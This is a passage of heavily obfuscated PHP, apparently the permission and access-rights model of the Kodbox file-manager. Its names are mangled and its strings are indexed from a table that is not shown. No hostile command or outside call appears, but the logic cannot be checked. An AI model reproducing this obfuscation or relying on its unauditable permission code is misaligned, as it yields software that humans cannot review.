$–É´’Õ²[8]); $ùÊß½º…[] = $ëä˜•áº; $Ô—¿®İœ = count(explode($–É´’Õ²[8], trim($ëä˜•áº[$–É´’Õ²[595]], $–É´’Õ²[8]))); $ÇâÃŒà[] = $Ô—¿®İœ + ($ëä˜•áº[$–É´’Õ²[33]] == $–É´’Õ²[78] ? 0 : 1000); } array_multisort($ÇâÃŒà, SORT_ASC, $ùÊß½º…); return $ùÊß½º…; } private function groupChidldAllRootSource($ÛÌÙİõ) { $ÒÈùè•´ =& $_SERVER[åÄ¼Ùßš]; $°ĞÎï°á = Model($ÒÈùè•´[1426])->groupChildrenAll($ÛÌÙİõ); $ı„¢ˆÓÇ = array($ÒÈùè•´[193] => 0, $ÒÈùè•´[582] => array($ÒÈùè•´[7], $°ĞÎï°á), $ÒÈùè•´[191] => SourceModel::TYPE_GROUP); $‰¶²¥Ì© = Model($ÒÈùè•´[926])->field($ÒÈùè•´[194])->where($ı„¢ˆÓÇ)->select(); $‰¶²¥Ì© = array_to_keyvalue($‰¶²¥Ì©, $ÒÈùè•´[12], $ÒÈùè•´[194]); return $‰¶²¥Ì©; } private function authTargetInfo($°±×˜•Ø) { $ŠšĞ‹‹’ =& $_SERVER[åÄ¼Ùßš]; $ş’¦½ØÕ = array(); $–ëé¸”“ = array(); $ô…ÀóÏÀ = 2 << 25; foreach ($°±×˜•Ø as $Ááù±¥…) { $’şÖä­ç = Model($ŠšĞ‹‹’[584])->listData($Ááù±¥…[$ŠšĞ‹‹’[2125]]); if (!$’şÖä­ç) { continue; } if ($Ááù±¥…[$ŠšĞ‹‹’[191]] == SourceModel::TYPE_USER) { $¤¶“¤¬ = Model($ŠšĞ‹‹’[590])->getInfoSimpleOuter($Ááù±¥…[$ŠšĞ‹‹’[582]]); if ($¤¶“¤¬[$ŠšĞ‹‹’[1817]] == $ŠšĞ‹‹’[1311]) { continue; } if ($¤¶“¤¬[$ŠšĞ‹‹’[1817]] == $ŠšĞ‹‹’[231]) { $¤¶“¤¬[$ŠšĞ‹‹’[32]] = LNG($ŠšĞ‹‹’[2227]); } } else { $¤¶“¤¬ = Model($ŠšĞ‹‹’[598])->getInfoSimple($Ááù±¥…[$ŠšĞ‹‹’[582]]); } if (!$¤¶“¤¬) { continue; } $¤¶“¤¬[$ŠšĞ‹‹’[553]] = $’şÖä­ç; $ş’¦½ØÕ[] = $¤¶“¤¬; $ˆÂŠØÏÊ = 0; if ($Ááù±¥…[$ŠšĞ‹‹’[191]] == SourceModel::TYPE_GROUP) { $ˆÂŠØÏÊ = $ô…ÀóÏÀ * 2; } if ($Ááù±¥…[$ŠšĞ‹‹’[191]] == SourceModel::TYPE_USER) { $ˆÂŠØÏÊ = $ô…ÀóÏÀ; } if ($Ááù±¥…[$ŠšĞ‹‹’[191]] == SourceModel::TYPE_USER && $Ááù±¥…[$ŠšĞ‹‹’[582]] == $ŠšĞ‹‹’[231]) { $ˆÂŠØÏÊ = 0; } $–ëé¸”“[] = $’şÖä­ç[$ŠšĞ‹‹’[499]] + $ˆÂŠØÏÊ; } array_multisort($–ëé¸”“, SORT_DESC, $ş’¦½ØÕ); return $ş’¦½ØÕ; } public function getAllChildrenByUser($º…°ã§ú, $—ÇÎøÇ”) { $ÃÛÁ›Ûè =& $_SERVER[åÄ¼Ùßš]; $³ÁœÓ¥Ç = Model($ÃÛÁ›Ûè[610])->getInfo($—ÇÎøÇ”); if (!$—ÇÎøÇ” || !$º…°ã§ú || !$³ÁœÓ¥Ç) { return array(); } $«®¦·÷ = Model($ÃÛÁ›Ûè[1466])->sourceInfo($º…°ã§ú); $Ç³¬³Ò = array(); $Ò¥ ‡ö = 1; if ($«®¦·÷[$ÃÛÁ›Ûè[193]] == $ÃÛÁ›Ûè[231] && $«®¦·÷[$ÃÛÁ›Ûè[582]] != $Ò¥ ‡ö && $this->groupContainUser($«®¦·÷[$ÃÛÁ›Ûè[582]], $—ÇÎøÇ”)) { foreach ($³ÁœÓ¥Ç[$ÃÛÁ›Ûè[1427]] as $ÅŒ¥ŒıÃ) { $§İÔ•€´ = Model($ÃÛÁ›Ûè[598])->getInfo($ÅŒ¥ŒıÃ[$ÃÛÁ›Ûè[1428]]); $âÂıƒù¿ = Model($ÃÛÁ›Ûè[610])->getInfoSimpleOuter($—ÇÎøÇ”); $âÂıƒù¿[$ÃÛÁ›Ûè[553]] = $ÅŒ¥ŒıÃ[$ÃÛÁ›Ûè[499]]; if (Model($ÃÛÁ›Ûè[584])->authCheckAction($ÅŒ¥ŒıÃ[$ÃÛÁ›Ûè[499]][$ÃÛÁ›Ûè[499]], $ÃÛÁ›Ûè[2038])) { continue; } $ñùÉ“È = array($ÃÛÁ›Ûè[32] => $ÃÛÁ›Ûè[1331] . $§İÔ•€´[$ÃÛÁ›Ûè[32]], $ÃÛÁ›Ûè[194] => $§İÔ•€´[$ÃÛÁ›Ûè[90]][$ÃÛÁ›Ûè[194]], $ÃÛÁ›Ûè[87] => KodIO::make($§İÔ•€´[$ÃÛÁ›Ûè[90]][$ÃÛÁ›Ûè[194]]), $ÃÛÁ›Ûè[193] => $ÃÛÁ›Ûè[231], $ÃÛÁ›Ûè[191] => $ÃÛÁ›Ûè[591], $ÃÛÁ›Ûè[33] => $ÃÛÁ›Ûè[632], $ÃÛÁ›Ûè[595] => $§İÔ•€´[$ÃÛÁ›Ûè[602]], $ÃÛÁ›Ûè[1428] => $§İÔ•€´[$ÃÛÁ›Ûè[1428]], $ÃÛÁ›Ûè[599] => $§İÔ•€´[$ÃÛÁ›Ûè[193]], $ÃÛÁ›Ûè[2223] => array($âÂıƒù¿)); $Ç³¬³Ò[$ñùÉ“È[$ÃÛÁ›Ûè[194]]] = $ñùÉ“È; } } $õ´â±¿ = array(); $‰‡“³û = $this->getAllChildren($º…°ã§ú); foreach ($‰‡“³û as $«±«õøæ) { $‘ÂÆ•æÆ = !1; foreach ($«±«õøæ[$ÃÛÁ›Ûè[2223]] as $óêà©–®) { if ($óêà©–®[$ÃÛÁ›Ûè[1817]]) { if ($óêà©–®[$ÃÛÁ›Ûè[1817]] == $—ÇÎøÇ”) { $‘ÂÆ•æÆ = !0; break; } } if ($óêà©–®[$ÃÛÁ›Ûè[1428]]) { if ($this->groupContainUser($óêà©–®[$ÃÛÁ›Ûè[1428]], $—ÇÎøÇ”)) { $‘ÂÆ•æÆ = !0; break; } } } if ($‘ÂÆ•æÆ) { $õ´â±¿[] = $«±«õøæ; } $şºñ¤•Ø = $«±«õøæ[$ÃÛÁ›Ûè[194]]; if (isset($Ç³¬³Ò[$şºñ¤•Ø])) { $«±«õøæ[$ÃÛÁ›Ûè[2223]][] = $Ç³¬³Ò[$şºñ¤•Ø][0]; $Ç³¬³Ò[$şºñ¤•Ø] = !1; } } $Ç³¬³Ò = array_filter(array_values($Ç³¬³Ò)); $õ´â±¿ = array_merge($Ç³¬³Ò, $õ´â±¿); return $õ´â±¿; } public function setAllChildrenByUser($õâÑëÁ…, $ıœ¶íœ, $ª»ä‡ê„) { $ûäŒ‘ª’ =& $_SERVER[åÄ¼Ùßš]; $ó×Êéè = $this->getAllChildrenByUser($õâÑëÁ…, $ıœ¶íœ); if (!$ª»ä‡ê„ || !$ó×Êéè) { return !1; } foreach ($ó×Êéè as $µôŞ£œÏ) { $À©ºÔ¯ = array(); foreach ($µôŞ£œÏ[$ûäŒ‘ª’[2223]] as $Õ¢¡Á¶Ú) { $ëÒË“¼› = $Õ¢¡Á¶Ú[$ûäŒ‘ª’[553]]; $³ïÙÕê’ = $Õ¢¡Á¶Ú[$ûäŒ‘ª’[1817]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $Ø˜÷àûá = $Õ¢¡Á¶Ú[$ûäŒ‘ª’[1817]] ? $Õ¢¡Á¶Ú[$ûäŒ‘ª’[1817]] : $Õ¢¡Á¶Ú[$ûäŒ‘ª’[1428]]; if ($Õ¢¡Á¶Ú[$ûäŒ‘ª’[1817]] && $Õ¢¡Á¶Ú[$ûäŒ‘ª’[1817]] == $ıœ¶íœ) { continue; } $À©ºÔ¯[] = array($ûäŒ‘ª’[194] => $µôŞ£œÏ[$ûäŒ‘ª’[194]], $ûäŒ‘ª’[191] => $³ïÙÕê’, $ûäŒ‘ª’[582] => intval($Ø˜÷àûá), $ûäŒ‘ª’[2125] => isset($ëÒË“¼›[$ûäŒ‘ª’[484]]) ? intval($ëÒË“¼›[$ûäŒ‘ª’[484]]) : 0, $ûäŒ‘ª’[2188] => isset($ëÒË“¼›[$ûäŒ‘ª’[2188]]) ? intval($ëÒË“¼›[$ûäŒ‘ª’[2188]]) : -1); } $À©ºÔ¯[] = array($ûäŒ‘ª’[194] => $µôŞ£œÏ[$ûäŒ‘ª’[194]], $ûäŒ‘ª’[191] => SourceModel::TYPE_USER, $ûäŒ‘ª’[582] => intval($ıœ¶íœ), $ûäŒ‘ª’[2125] => intval($ª»ä‡ê„), $ûäŒ‘ª’[2188] => -1); $this->where(array($ûäŒ‘ª’[503] => $µôŞ£œÏ[$ûäŒ‘ª’[194]]))->delete(); $this->addAll($À©ºÔ¯); } return !0; } public function get($à‹³¤ø®) { $ˆ¦÷ü¨» = $this->getSourceList(array($à‹³¤ø®), !0); return $ˆ¦÷ü¨»[0]; } public function getSourceList($òÃàéÜÀ, $ñê÷ñ¥« = false, $üíÌÌÂÕ = false) { $¾”¬œ¬× =& $_SERVER[åÄ¼Ùßš]; if (!$òÃàéÜÀ) { return array(); } $÷»ôÜ†’ = Model($¾”¬œ¬×[1466]); if (!$ñê÷ñ¥« && count($òÃàéÜÀ) == 1) { $ñê÷ñ¥« = array(); $ñê÷ñ¥«[$òÃàéÜÀ[0]] = $÷»ôÜ†’->sourceInfo($òÃàéÜÀ[0]); } if (!$ñê÷ñ¥«) { $ó¡ß‘¼³ = array($¾”¬œ¬×[503] => array($¾”¬œ¬×[504], $òÃàéÜÀ)); $ñê÷ñ¥« = $÷»ôÜ†’->field($¾”¬œ¬×[2228])->where($ó¡ß‘¼³)->select(); $ñê÷ñ¥« = array_to_keyvalue($ñê÷ñ¥«, $¾”¬œ¬×[194]); } $¤‹©×ó… = $òÃàéÜÀ; foreach ($ñê÷ñ¥« as $¨Ÿášäş => $šÚÔÒ¾Ç) { $îëû”Ï¬ = $÷»ôÜ†’->parentLevelArray($šÚÔÒ¾Ç[$¾”¬œ¬×[597]]); $¤‹©×ó… = array_merge($¤‹©×ó…, array(intval($¨Ÿášäş)), array_reverse($îëû”Ï¬)); } $¤‹©×ó… = array_values(array_unique($¤‹©×ó…)); if (!$¤‹©×ó…) { return array(); } $Ã¦‘ù›î = $this->sourceAuthSelect($¤‹©×ó…); $•Ì‘ ÛÙ = array(); foreach ($¤‹©×ó… as $É¥ºñ‘›) { if (isset($Ã¦‘ù›î[$É¥ºñ‘›])) { $•Ì‘ ÛÙ[$É¥ºñ‘›] = $Ã¦‘ù›î[$É¥ºñ‘›]; } } $ıŒ‰ÍÃ’ = $this->userIsRoot($üíÌÌÂÕ); $çÉõ¶®ª = AuthModel::authAll(); $’Ã©­Úç = array($¾”¬œ¬×[500] => $çÉõ¶®ª, $¾”¬œ¬×[2229] => array($¾”¬œ¬×[505] => 0, $¾”¬œ¬×[2023] => $çÉõ¶®ª, $¾”¬œ¬×[506] => LNG($¾”¬œ¬×[2210]), $¾”¬œ¬×[2040] => $¾”¬œ¬×[2211])); $Êá©‹Á× = array(); foreach ($ñê÷ñ¥« as $É¥ºñ‘› => $½¶ÑÄú) { if ($ıŒ‰ÍÃ’ && $GLOBALS[$¾”¬œ¬×[6]][$¾”¬œ¬×[2036]]) { $Êá©‹Á×[$É¥ºñ‘›] = $’Ã©­Úç; continue; } $Êá©‹Á×[$É¥ºñ‘›] = $this->makeSourceAuth($½¶ÑÄú, $•Ì‘ ÛÙ, $üíÌÌÂÕ); } return $Êá©‹Á×; } public function authDeepCheck($®¯ÅÃĞí, $Ì°÷çŠ  = false) { $¹Ò°¢›Â =& $_SERVER[åÄ¼Ùßš]; $Ì°÷çŠ  = $Ì°÷çŠ  ? $Ì°÷çŠ  : USER_ID; $œ‰‡Ïâ = $this->makeAuthDeep($Ì°÷çŠ ); if (!in_array($®¯ÅÃĞí, $œ‰‡Ïâ[$¹Ò°¢›Â[2230]])) { return !1; } $ÅâÉõáñ = array(); foreach ($œ‰‡Ïâ[$¹Ò°¢›Â[2231]] as $°Ÿæ¢†× => $£Şåò÷) { if (!in_array($®¯ÅÃĞí, $£Şåò÷)) { continue; } $ÅâÉõáñ[] = $°Ÿæ¢†×; } if (!$ÅâÉõáñ) { return !1; } $¸µàúŞš = $ÅâÉõáñ ? $ÅâÉõáñ[0] : $®¯ÅÃĞí; return array($¹Ò°¢›Â[500] => -1, $¹Ò°¢›Â[553] => array($¹Ò°¢›Â[505] => $¹Ò°¢›Â[1311], $¹Ò°¢›Â[2023] => $¹Ò°¢›Â[231], $¹Ò°¢›Â[506] => LNG($¹Ò°¢›Â[2232]), $¹Ò°¢›Â[2040] => $¹Ò°¢›Â[2233]), $¹Ò°¢›Â[2221] => LNG($¹Ò°¢›Â[2234]), $¹Ò°¢›Â[2235] => $this->sourceAuthInfo($¸µàúŞš)); } protected function makeAuthDeep($Ô¦¢ÛÆ = false) { $ÓÅšÔéà =& $_SERVER[åÄ¼Ùßš]; static $¯ôëÇ¦ = array(); $Ô¦¢ÛÆ = $Ô¦¢ÛÆ ? $Ô¦¢ÛÆ : USER_ID; if (isset($¯ôëÇ¦[$Ô¦¢ÛÆ])) { return $¯ôëÇ¦[$Ô¦¢ÛÆ]; } $Ê–•Úş = Model($ÓÅšÔéà[2236])->listData(); $­ƒ¥‡Ù® = array(); foreach ($Ê–•Úş as $ÒÛÔ‰¨) { if ($ÒÛÔ‰¨[$ÓÅšÔéà[499]] == 0 && $ÒÛÔ‰¨[$ÓÅšÔéà[2039]] == $ÓÅšÔéà[91]) { $­ƒ¥‡Ù®[] = $ÒÛÔ‰¨[$ÓÅšÔéà[484]]; } } $ßÒ²ÁñÆ = $this->userGroupParents($Ô¦¢ÛÆ); $ĞìÌ©¼Æ = array($ÓÅšÔéà[191] => SourceModel::TYPE_USER, $ÓÅšÔéà[582] => $Ô¦¢ÛÆ); if ($ßÒ²ÁñÆ) { $ĞìÌ©¼Æ = array(array($ÓÅšÔéà[191] => SourceModel::TYPE_USER, $ÓÅšÔéà[582] => $Ô¦¢ÛÆ), array($ÓÅšÔéà[191] => SourceModel::TYPE_GROUP, $ÓÅšÔéà[582] => array($ÓÅšÔéà[504], $ßÒ²ÁñÆ)), $ÓÅšÔéà[1108] => $ÓÅšÔéà[2119]); } $ŞÕÊ†Ë° = $this->field($ÓÅšÔéà[2237])->where($ĞìÌ©¼Æ)->select(); $µÍ¡´¦Ÿ = array(); $ãùº§Í½ = array_to_keyvalue_group($ŞÕÊ†Ë°, $ÓÅšÔéà[194]); foreach ($ãùº§Í½ as $ôî§Å Ú => $•¬Ÿ¤€ˆ) { $Ó¯ùËıÄ = $this->authArrayCheck($•¬Ÿ¤€ˆ, $Ô¦¢ÛÆ); if ($Ó¯ùËıÄ[$ÓÅšÔéà[500]] > 0) { $µÍ¡´¦Ÿ[] = $ôî§Å Ú . $ÓÅšÔéà[12]; } } if ($ßÒ²ÁñÆ) { $ƒ¿ÛË = Model($ÓÅšÔéà[598]); foreach ($ßÒ²ÁñÆ as $Ú”½şĞö) { $•ì•òÙí = $ƒ¿ÛË->getInfo($Ú”½şĞö); if (!$•ì•òÙí || !is_array($•ì•òÙí[$ÓÅšÔéà[90]])) { continue; } $µÍ¡´¦Ÿ[] = $•ì•òÙí[$ÓÅšÔéà[90]][$ÓÅšÔéà[194]]; } } $çœ­¸í = array(); $¢‚Ñ®¥ = $ßÒ²ÁñÆ; $«‚ÊÌ§ = Model($ÓÅšÔéà[1466]); $ƒ¿ÛË = Model($ÓÅšÔéà[598]); $³ûò™¨ = array(); $í‰ö¹şª = array(); $ëÊ…¡¥È = array(); $¸êŒÈğø = array(); if ($µÍ¡´¦Ÿ) { $ É›£ş› = $«‚ÊÌ§->where(array($ÓÅšÔéà[194] => array($ÓÅšÔéà[504], $µÍ¡´¦Ÿ)))->select(); foreach ($ É›£ş› as $Øî‘Ï²») { if ($Øî‘Ï²»[$ÓÅšÔéà[517]] == $ÓÅšÔéà[91]) { continue; } $¬æğÑï÷ = $«‚ÊÌ§->parentLevelArray($Øî‘Ï²»[$ÓÅšÔéà[597]]); $çœ­¸í = array_merge($çœ­¸í, $¬æğÑï÷); $¢‚Ñ®¥[] = $Øî‘Ï²»[$ÓÅšÔéà[582]]; $³ûò™¨[$Øî‘Ï²»[$ÓÅšÔéà[194]]] = $¬æğÑï÷; $í‰ö¹şª[$Øî‘Ï²»[$ÓÅšÔéà[194]]] = $Øî‘Ï²»[$ÓÅšÔéà[582]]; } } $¢‚Ñ®¥ = array_values(array_unique($¢‚Ñ®¥)); $”ßÉôºá = $¢‚Ñ®¥; foreach ($”ßÉôºá as $Ú”½şĞö) { $•ì•òÙí = $ƒ¿ÛË->getInfo($Ú”½şĞö); $¬æğÑï÷ = $«‚ÊÌ§->parentLevelArray($•ì•òÙí[$ÓÅšÔéà[597]]); $¢‚Ñ®¥ = array_merge($¢‚Ñ®¥, $¬æğÑï÷); } $¢‚Ñ®¥ = array_values(array_unique($¢‚Ñ®¥)); foreach ($¢‚Ñ®¥ as $Ú”½şĞö) { $•ì•òÙí = $ƒ¿ÛË->getInfo($Ú”½şĞö); $çœ­¸í[] = $•ì•òÙí[$ÓÅšÔéà[90]][$ÓÅšÔéà[194]]; $ëÊ…¡¥È[$Ú”½şĞö] = $•ì•òÙí[$ÓÅšÔéà[90]][$ÓÅšÔéà[194]]; $¸êŒÈğø[$Ú”½şĞö] = $«‚ÊÌ§->parentLevelArray($•ì•òÙí[$ÓÅšÔéà[597]]); } foreach ($³ûò™¨ as $­“½¥œ­ => $ŞµñÑ») { $·’ó¼ç = $í‰ö¹şª[$­“½¥œ­]; if (!$·’ó¼ç || !$ëÊ…¡¥È[$·’ó¼ç]) { continue; } $û§İãƒè = array(); foreach ($¸êŒÈğø[$·’ó¼ç] as $Ú”½şĞö) { $û§İãƒè[] = $ëÊ…¡¥È[$Ú”½şĞö]; } $³ûò™¨[$­“½¥œ­] = array_merge($û§İãƒè, $ŞµñÑ»); } $çœ­¸í = array_values(array_unique($çœ­¸í)); $ÛÍÏ£ = array($ÓÅšÔéà[2230] => $çœ­¸í, $ÓÅšÔéà[2231] => $³ûò™¨); $¯ôëÇ¦[$Ô¦¢ÛÆ] = $ÛÍÏ£; return $ÛÍÏ£; } private function makeSourceAuth($¦ÏäØ, $Ÿ€·øô, $×Şˆ†—… = false) { $êí›§€ =& $_SERVER[åÄ¼Ùßš]; $•œ˜×ñ¡ = $êí›§€[91]; $ƒ»œƒóœ = $¦ÏäØ[$êí›§€[582]]; $¾ å¨Ñ = $¦ÏäØ[$êí›§€[191]] == SourceModel::TYPE_GROUP; $„ìíû = $¾ å¨Ñ ? $this->groupRootAuth($ƒ»œƒóœ, $×Şˆ†—…) : !1; if ($„ìíû && Model($êí›§€[584])->authCheckAction($„ìíû[$êí›§€[499]], $êí›§€[2038])) { return $this->groupAuthInfo($„ìíû, $ƒ»œƒóœ); } $ú‚¾Â×¥ = Model($êí›§€[1466])->parentLevelArray($¦ÏäØ[$êí›§€[597]]); $ú‚¾Â×¥ = array_merge(array($¦ÏäØ[$êí›§€[194]]), array_reverse($ú‚¾Â×¥)); $¿ùŞÂş² = !1; foreach ($ú‚¾Â×¥ as $²‹´‡˜) { if (!isset($Ÿ€·øô[$²‹´‡˜])) { continue; } $²ø©ˆ•º = $this->authMake($Ÿ€·øô[$²‹´‡˜], $×Şˆ†—…); if ($²ø©ˆ•º[$êí›§€[553]]) { $¿ùŞÂş² = $²ø©ˆ•º; break; } } if (!$¾ å¨Ñ) { return $¿ùŞÂş²; } if (!$¿ùŞÂş² && $„ìíû) { $¿ùŞÂş² = $this->groupAuthInfo($„ìíû, $ƒ»œƒóœ); } if (!$¿ùŞÂş²) { $šúøˆ = Model($êí›§€[598])->getInfo($ƒ»œƒóœ); $¬É—ÊÂ = explode($êí›§€[50], trim($šúøˆ[$êí›§€[597]], $êí›§€[50])); $¬É—ÊÂ = array_reverse($¬É—ÊÂ); foreach ($¬É—ÊÂ as $‚—¢¤Ùå) { if ($‚—¢¤Ùå == $êí›§€[231] || $‚—¢¤Ùå == $•œ˜×ñ¡) { continue; } $„áåòëÃ = $this->groupRootAuth($‚—¢¤Ùå, $×Şˆ†—…); if (!$„áåòëÃ) { continue; } $¿ùŞÂş² = $this->groupAuthInfo($„áåòëÃ, $‚—¢¤Ùå); break; } } if (!$¿ùŞÂş² || $¿ùŞÂş²[$êí›§€[500]] <= 0) { $Êˆ ì€¥ = $this->authDeepCheck($¦ÏäØ[$êí›§€[194]], $×Şˆ†—…); if ($Êˆ ì€¥) { $¿ùŞÂş² = $Êˆ ì€¥; } } return $¿ùŞÂş²; } private function userIsRoot($ëñÌêƒá = false) { $˜©ó¸ô =& $_SERVER[åÄ¼Ùßš]; if (!$ëñÌêƒá && KodUser::isRoot()) { return !0; } $„¦ºü¶ = Model($˜©ó¸ô[610])->getInfo($ëñÌêƒá); $ÃİÜüç™ = Model($˜©ó¸ô[2214])->listData($„¦ºü¶[$˜©ó¸ô[2215]]); if ($ÃİÜüç™ && $ÃİÜüç™[$˜©ó¸ô[588]][$˜©ó¸ô[2218]] == 1) { return !0; } return !1; } private function sourceAuthInfo($ìƒÙ¼ªé) { $ı˜¬‡Ûã =& $_SERVER[åÄ¼Ùßš]; $‘¼ıüò€ = Model($ı˜¬‡Ûã[1466]); $ø ˜÷Æ° = $‘¼ıüò€->sourceInfo($ìƒÙ¼ªé); if (!$ø ˜÷Æ°) { return !1; } $‘¼ıüò€->groupPathDisplay($ø ˜÷Æ°); $Íıƒ”ŠÉ = array($ø ˜÷Æ°); $Íıƒ”ŠÉ = $‘¼ıüò€->_listAppendPath($Íıƒ”ŠÉ, !1); $ø ˜÷Æ° = $Íıƒ”ŠÉ[0]; $ñë¨· ¹ = $ø ˜÷Æ°[$ı˜¬‡Ûã[595]]; if (isset($ø ˜÷Æ°[$ı˜¬‡Ûã[603]])) { $¯ÕúƒÑÜ = explode($ı˜¬‡Ûã[8], trim($ø ˜÷Æ°[$ı˜¬‡Ûã[595]], $ı˜¬‡Ûã[8])); array_shift($¯ÕúƒÑÜ); $ñë¨· ¹ = $ø ˜÷Æ°[$ı˜¬‡Ûã[601]] . $ı˜¬‡Ûã[2238] . implode($ı˜¬‡Ûã[8], $¯ÕúƒÑÜ); } return array($ı˜¬‡Ûã[32] => $ø ˜÷Æ°[$ı˜¬‡Ûã[32]], $ı˜¬‡Ûã[194] => $ø ˜÷Æ°[$ı˜¬‡Ûã[194]], $ı˜¬‡Ûã[87] => KodIO::make($ø ˜÷Æ°[$ı˜¬‡Ûã[194]]), $ı˜¬‡Ûã[595] => $ñë¨· ¹); } private function groupAuthInfo($·Š¨Ô™‘, $œ›˜øÃø) { $õ©ñßÜÜ =& $_SERVER[åÄ¼Ùßš]; $ªÔ¾Ôûã = Model($õ©ñßÜÜ[598])->getInfo($œ›˜øÃø); return array($õ©ñßÜÜ[2239] => intval($·Š¨Ô™‘[$õ©ñßÜÜ[499]]), $õ©ñßÜÜ[2229] => $·Š¨Ô™‘, $õ©ñßÜÜ[2240] => LNG($õ©ñßÜÜ[2241]), $õ©ñßÜÜ[2235] => array($õ©ñßÜÜ[506] => $ªÔ¾Ôûã[$õ©ñßÜÜ[32]], $õ©ñßÜÜ[87] => KodIO::make($ªÔ¾Ôûã[$õ©ñßÜÜ[90]][$õ©ñßÜÜ[194]]), $õ©ñßÜÜ[2242] => $ªÔ¾Ôûã[$õ©ñßÜÜ[602]])); } protected function groupRootAuth($¢Œöí²Õ, $Ğ¤Ôİü = false) { $¸ÔŠ‡õ… =& $_SERVER[åÄ¼Ùßš]; $Ğ¤Ôİü = $Ğ¤Ôİü ? $Ğ¤Ôİü : USER_ID; $™”ÅÉö× = $Ğ¤Ôİü . $¸ÔŠ‡õ…[2243] . $¢Œöí²Õ; static $½”™ø¯ = array(); if (isset($½”™ø¯[$™”ÅÉö×])) { return $½”™ø¯[$™”ÅÉö×]; } $—‚¼ãÂ¥ = Model($¸ÔŠ‡õ…[598])->getInfo($¢Œöí²Õ); $¤œŒ…¨“ = $this->userGroupList($Ğ¤Ôİü); $ˆ•ÁŞù = isset($¤œŒ…¨“[$¢Œöí²Õ]) ? $¤œŒ…¨“[$¢Œöí²Õ][$¸ÔŠ‡õ…[499]] : !1; if ($ˆ•ÁŞù && Model($¸ÔŠ‡õ…[584])->authCheckAction($ˆ•ÁŞù[$¸ÔŠ‡õ…[499]], $¸ÔŠ‡õ…[2038])) { $½”™ø¯[$™”ÅÉö×] = $ˆ•ÁŞù; return $ˆ•ÁŞù; } $æ¬Û³ÂÖ = $this->sourceAuthSelect($—‚¼ãÂ¥[$¸ÔŠ‡õ…[90]][$¸ÔŠ‡õ…[194]]); $›ˆšİ’¬ = $æ¬Û³ÂÖ ? $this->authMake($æ¬Û³ÂÖ, $Ğ¤Ôİü) : !1; $ßÖ’Ö•ú = $›ˆšİ’¬ ? $›ˆšİ’¬[$¸ÔŠ‡õ…[553]] : !1; $½”™ø¯[$™”ÅÉö×] = $ßÖ’Ö•ú ? $ßÖ’Ö•ú : $ˆ•ÁŞù; return $½”™ø¯[$™”ÅÉö×]; } public function authOwnerApply($ğŸ®ÓÄÔ) { $ÏñîÃÇƒ =& $_SERVER[åÄ¼Ùßš]; if (empty($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[499]]) || isset($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[2244]]) && $ğŸ®ÓÄÔ[$ÏñîÃÇƒ[2244]]) { return $ğŸ®ÓÄÔ; } if (AuthModel::authCheckRoot($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[499]][$ÏñîÃÇƒ[500]])) { return $ğŸ®ÓÄÔ; } $©ÔÙÎ½Î = Model($ÏñîÃÇƒ[1466])->parentLevelArray($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[597]]); $©ÔÙÎ½Î = array_merge(array($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[194]]), array_reverse($©ÔÙÎ½Î)); $¤•²ãø– = $this->sourceAuthSelect($©ÔÙÎ½Î); $ÂÃ®¶­š = array(); $ÎâŠ¬¬ = array(); foreach ($¤•²ãø– as $Á¼Á©¾Ï => $¢‹½¬ëÒ) { $’Ë˜ôÆé = $this->authFolderOwnerUser($¢‹½¬ëÒ); $ÂÃ®¶­š[$Á¼Á©¾Ï] = $’Ë˜ôÆé; $ÎâŠ¬¬ = array_merge($ÎâŠ¬¬, $’Ë˜ôÆé[$ÏñîÃÇƒ[678]]); if ($’Ë˜ôÆé[$ÏñîÃÇƒ[2245]]) { break; } } if (count($ÎâŠ¬¬) == 0) { $ÎâŠ¬¬ = $this->authFolderOwnerGroup($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[582]]); } $ÎâŠ¬¬ = array_unique($ÎâŠ¬¬); if (AuthModel::authCheckRoot($ğŸ®ÓÄÔ[$ÏñîÃÇƒ[499]][$ÏñîÃÇƒ[500]])) { $ÎâŠ¬¬[] = USER_ID; } $ğŸ®ÓÄÔ[$ÏñîÃÇƒ[499]][$ÏñîÃÇƒ[2246]] = Model($ÏñîÃÇƒ[590])->userListInfo($ÎâŠ¬¬); return $ğŸ®ÓÄÔ; } private function authFolderOwnerGroup($§¨§Ê‡) { $·ÏÎ¿Øœ =& $_SERVER[åÄ¼Ùßš]; $¶Óİ£É = Model($·ÏÎ¿Øœ[2111])->where(array($·ÏÎ¿Øœ[1428] => $§¨§Ê‡))->select(); $°ïÃ€µ› = array(); if (!$¶Óİ£É) { return $°ïÃ€µ›; } foreach ($¶Óİ£É as $¶¶¿û) { $Ò°¹Š‰ß = $this->authInfo($¶¶¿û); if (AuthModel::authCheckRoot($Ò°¹Š‰ß[$·ÏÎ¿Øœ[499]])) { $°ïÃ€µ›[] = $¶¶¿û[$·ÏÎ¿Øœ[1817]]; } } return $°ïÃ€µ›; } private function authFolderOwnerUser($ãÖÕÓĞ) { $ŞÖŞÀÄ¶ =& $_SERVER[åÄ¼Ùßš]; $Õì–îùê = array(); $ïƒ”Òƒ = !1; foreach ($ãÖÕÓĞ as $üÊŒ¦Ëü) { $–ƒ¨À¢ = $this->authInfo($üÊŒ¦Ëü); if ($üÊŒ¦Ëü[$ŞÖŞÀÄ¶[582]] == $ŞÖŞÀÄ¶[231]) { $ïƒ”Òƒ = !0; } if ($üÊŒ¦Ëü[$ŞÖŞÀÄ¶[191]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($–ƒ¨À¢[$ŞÖŞÀÄ¶[499]])) { $Õì–îùê[] = $üÊŒ¦Ëü[$ŞÖŞÀÄ¶[582]]; } } } return array($ŞÖŞÀÄ¶[678] => $Õì–îùê, $ŞÖŞÀÄ¶[2245] => $ïƒ”Òƒ); } public function authMake($¾·¢¨îÊ, $ïòË­å¸ = false) { $ş¦íÑ‰ =& $_SERVER[åÄ¼Ùßš]; $ç”Æ¾™Í = $this->authArrayCheck($¾·¢¨îÊ, $ïòË­å¸); if ($ç”Æ¾™Í[$ş¦íÑ‰[2225]]) { $ç”Æ¾™Í[$ş¦íÑ‰[2225]] = $this->sourceAuthInfo($ç”Æ¾™Í[$ş¦íÑ‰[2225]]); } return $ç”Æ¾™Í; } public function authArrayCheck($šĞ×İŠ, $ÓöÕ¢ë = false) { $¥ƒ€­â‡ =& $_SERVER[åÄ¼Ùßš]; if (!$šĞ×İŠ) { return 